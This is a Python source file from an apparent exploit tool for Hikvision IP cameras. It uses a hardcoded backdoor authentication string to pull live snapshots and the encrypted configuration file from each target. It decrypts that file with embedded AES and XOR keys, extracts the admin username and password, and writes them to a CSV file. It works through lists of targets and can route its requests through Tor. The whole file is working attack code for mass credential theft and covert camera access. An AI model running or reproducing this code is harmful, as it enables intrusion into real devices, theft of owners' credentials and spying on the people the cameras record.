from datetime import date

import requests
from hikexpl.utils import decrypt, extract_words, find_admin_index, extract
import logging

logger = logging.getLogger("hikexpl")

HIK_BD='?auth=YWRtaW46MTEK'
CONFIG_AES_KEY='279977f62f6cfd2d91cd75b889ce0c9a'
CONFIG_XOR_KEY=bytearray([0x73, 0x8B, 0x55, 0x44])

def download_snapshot(target, session:requests.sessions, folder="."):
    with session as s:
        r = s.get(f"{target}/onvif-http/snapshot{HIK_BD}", timeout=5, verify=False)
        r.raise_for_status()  # Raise an error for unsuccessful requests
        file = f"{folder}/{target.split(':')[1][2:]}_{target.split(':')[2]}_{str(date.today())}.jpg"
        with open(file, 'wb') as f:
            for chunk in r.iter_content(1024):  # Download in chunks
                f.write(chunk)


def exploit_single(target, session):
    with session as s:
        r = s.get(f"{target}/System/configurationFile{HIK_BD}", timeout=5, verify=False)
        r.raise_for_status()  # Raise an error for unsuccessful requests

        config = decrypt(r.content, CONFIG_AES_KEY, CONFIG_XOR_KEY)
        words = extract_words(config)
        admin_index = find_admin_index(words)
        return extract(target, words, admin_index)


def make_new_session(use_tor=False):
    if use_tor:
        from torpy.http.requests import tor_requests_session
        session = tor_requests_session()
    else:
        session = requests.Session()

    return session
def exploit(targets, take_snapshots=True, extract_passwords=True, passwords_file='output.csv' ,snapshots_folder=".", use_tor=False, reuse_session=False):
    logger.info(f"Exploiting {len(targets)} targets")
    session = None
    for target in targets:
        try:
            logger.info(f"Attempting {target}")
            if (take_snapshots or extract_passwords) and (session is None or not reuse_session):
                session = make_new_session(use_tor)

            if take_snapshots:
                download_snapshot(target, session, snapshots_folder)

            if extract_passwords:
                (target, admin, password) = exploit_single(target, session)
                with open(passwords_file, 'a') as f:
                    f.write(f"{target},{admin},{password}\n")

        except Exception as e:
            logger.error(e.__class__.__name__, e)